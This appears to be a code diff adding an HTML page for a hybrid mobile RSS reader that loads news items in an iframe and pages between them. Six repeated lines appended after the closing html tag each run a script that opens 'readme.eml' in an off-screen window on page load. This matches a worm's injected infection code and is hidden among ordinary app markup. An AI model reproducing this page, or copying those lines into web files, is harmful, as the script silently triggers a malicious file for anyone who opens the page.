@@ -1,0 +1,285 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <meta name="viewport" id="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;minimum-scale=1.0; user-scalable=no;" />
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <link href="css/style.css" type="text/css" rel="stylesheet" />
+		<link rel="stylesheet" href="../css/common.css">
+        <!--<script type="application/javascript" src="js/iscroll.js"></script>-->
+        
+    </head>
+    <body>
+    	<script type="text/javascript" src="js/jquery.js"></script>
+        <script type="text/javascript" src="js/common.js"></script>
+       
+			<!--header开始-->
+<div id="wheader" class="header">
+	            <script type="text/javascript">
+                function myclose()
+                {
+                    var str_js = "uexWindow.close(-1);";
+                    uexWindow.evaluateScript('', '0', str_js);
+                }  
+            </script>
+     <div  data-role="header" class="header_main">
+     	 <span class="header_p" id="my_header_p" onClick="openeidtweibo()"></span>
+        <div class="title hide" id="title1"></div>
+        
+        <div onClick="myclose();" class="btn btn_head btn_head_l btn_head_return">返回</div>
+        <div ontouchstart="uexWindow.evaluateScript('', '0', 'COM.UTILS.closeWindow(0);')"  class="btn btn_head btn_head_r btn_head_home">首页</div>
+    </div> 
+	<nav class="header_border_60">
+		<ul id='orderList'>
+		</ul>
+	</nav>
+</div>
+
+<div class="footer_shadow"></div>
+
+    <!--header结束--> 
+        <div class="info_detail">
+            <!--<div style="height: 150px; width: 100%; background: url(images/loadingsmall.gif) center center no-repeat; display: none" id="tt">
+                <p style="text-align: center; padding-top: 120px;">loading...</p>
+            </div>-->
+            <iframe id="page" name="page" style="width: 100%; height: 100%; padding: 0px; border: 0px; font-size: 20px;" ></iframe>
+        </div>
+        <div class="bottom" id="wfooter">
+            <a href="javascript:void(0);"  class="left_a" onClick="uexWindow.evaluateScript('', '0', 'turn_left_page()');"></a> 
+            <a href="javascript:void(0);"  class="right_a" onClick="uexWindow.evaluateScript('', '0', 'turn_right_page()');" ></a>
+        </div>
+        <script type="text/javascript">
+            //parseParam();
+			var rssId=localStorage.rssid;
+			var my_id=localStorage.my_id;
+			var sw=localStorage.sw;
+            //var rssId = params[params.keys[0]];  	
+           // var my_id = params[params.keys[1]];		//rss数据数组下标
+            //var sw = params[params.keys[2]];
+            my_id = parseInt(my_id);
+            var url_ifr;
+            var rss_data;  //rss解析后的数据            
+            var listLength;  //rss新闻条数
+            
+            var list_index = 0; 
+            var left_index = 0;
+            var right_index =0;
+            
+            var baidu = "http://gate.baidu.com/?src=";  //百度转码
+
+          
+            //根据分辨率，获取页面头部和底部高度
+            
+            var head_height = 0;
+            var foot_height = 0;
+//            alert("屏幕分辨率宽=="+sw);
+            if (sw > 0 && sw < 320) {
+                head_height = 40;
+                foot_height = 32;
+            }
+            else 
+                if (sw >= 320 && sw < 480) {
+                    head_height = 50;
+                    foot_height = 40;
+                }
+            else {
+                head_height = 66;
+                foot_height = 60;
+            }
+
+
+//           if (sw > 0 && sw < 320) {
+//                head_height = 30;
+//                foot_height = 22;
+//            }
+//            else 
+//                if (sw >= 320 && sw < 480) {
+//                    head_height = 35;
+//                    foot_height = 30;
+//                }
+//            else {
+//                head_height = 56;
+//                foot_height = 50;
+//            }
+            window.uexOnload = function(type){
+                switch(type)
+                {
+                    case 0:
+                        var ho = document.getElementById("wheader");
+                        var fo = document.getElementById("wfooter");
+                        //$("#tt").show(); 
+                        var get_rssName_url  = myurl + "search_rss_name&rssId="+rssId;
+                        $.getJSON(get_rssName_url,function(data){
+                            if(data!=""){
+                                $("#my_header_p").html(data.inf_title);
+                                uexWindow.openSlibing("1", "2", "head.html", ho.outerHTML, "", head_height);	//ho.outerHTML
+                                uexWindow.openSlibing("2", "2", "head.html", fo.outerHTML, "", foot_height);   //fo.outerHTML     
+                            }
+                        });           
+                        break;
+                    case 1:
+                        uexWindow.showSlibing("1");
+//                        var ao=document.getElementById("wheader");
+//                        ao.parentNode.removeChild(ao);
+                        break;
+                    case 2:
+                        uexWindow.showSlibing("2");
+//                        var ao=document.getElementById("wfooter");
+//                        ao.parentNode.removeChild(ao);
+//                        get_source();
+                        //         show_detail();
+                        break;
+                }
+				
+            }
+            
+            window.uexOnshow = function(type){
+                switch(type)
+                {
+                    case 0:       
+                        break;
+                    case 1:
+                        var ao=document.getElementById("wheader");
+                        ao.parentNode.removeChild(ao);
+                        break;
+                    case 2:
+                        var ao=document.getElementById("wfooter");
+                        ao.parentNode.removeChild(ao);
+                        get_source();
+                        //         show_detail();
+                        break;
+                }
+            }
+            
+            //显示详细页面
+            function show_detail()
+            {
+                var ifr = document.getElementById("page");
+                //ifr.src = url_ifr;
+                $("#page").attr("src",url_ifr);
+                if (ifr.attachEvent){
+                    ifr.attachEvent("onload", function(){
+                        //hide_load();
+						uexWindow.closeToast();
+                    });
+                } else {
+                    ifr.onload = function(){
+                        //hide_load();
+						uexWindow.closeToast();
+                    };
+                }
+
+            }
+          
+            //给iframe加载过程中添加loading
+            function iframe_loading()
+            {
+                if (ifr.attachEvent){
+                    ifr.attachEvent("onload", function(){
+                        //hide_load();
+						uexWindow.closeToast();
+                    });
+                } else {
+                    ifr.onload = function(){
+                        //hide_load();
+						uexWindow.closeToast();
+                    };
+                }
+            }
+          
+
+            //loading hide
+            function hide_load(){
+                $("#tt").hide();
+            }
+	 		
+            //获取数据
+            function get_source()
+            {	
+                var get_rssSource_url = myurl + "read_rssSource&rssId="+rssId;
+		uexWindow.toast("1","5","正在加载...","0");		
+                $.getJSON(get_rssSource_url,function(data){
+                    if(data!=""){
+                        rss_data = data;
+                        listLength = rss_data.length;
+                        list_index = listLength -1;
+                        url_ifr = baidu + rss_data[my_id].link;
+                        show_detail();
+                    }
+                });
+            }
+			
+            //左翻页
+            function turn_left_page(){
+                //rss数组不为空
+                document.body.scrollTop=0;
+                //$("#tt").show();
+				uexWindow.toast("1","5","正在加载...","0");
+                if(listLength>0){
+                    if(my_id<=0){
+                        left_index =0;
+                        
+                        $("#page").attr("src",baidu + rss_data[left_index].link);
+                        
+                        $("#my_left_a").hide();
+                        return fasle;
+                    }else{
+                        $("#my_left_a").show();
+                        if(my_id>=list_index){
+                            $("#my_right_a").show();
+                        }
+                        left_index = parseInt(my_id) -1;
+                        
+                        $("#page").attr("src",baidu + rss_data[left_index].link); 
+                        
+                        my_id = left_index;
+                        iframe_loading();
+                    }
+                }else{
+                    return false;
+                }
+                //alert("left_index==="+left_index);
+            }
+			
+            //右翻页
+            function turn_right_page(){
+                //$("#tt").show();
+				uexWindow.toast("1","5","正在加载...","0");
+                document.body.scrollTop=0;
+                if(listLength>0){
+                    if(my_id<list_index){
+                        if(my_id>=0){
+                            $("#my_left_a").show();
+                        }
+                        right_index = parseInt(my_id) +1;
+                        $("#page").attr("src",baidu + rss_data[right_index].link);
+                        my_id = right_index;
+                        iframe_loading();
+                    }else{
+                        $("#my_left_a").show();
+                        right_index = list_index;
+                        $("#page").attr("src",baidu + rss_data[right_index].link);
+                        $("#my_right_a").hide();
+                        return false;
+                    }
+            		
+                }else{
+                    return;
+                }
+                //alert("right_index=="+right_index);
+            }
+              
+           
+              
+            
+        </script>
+
+
+    </body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
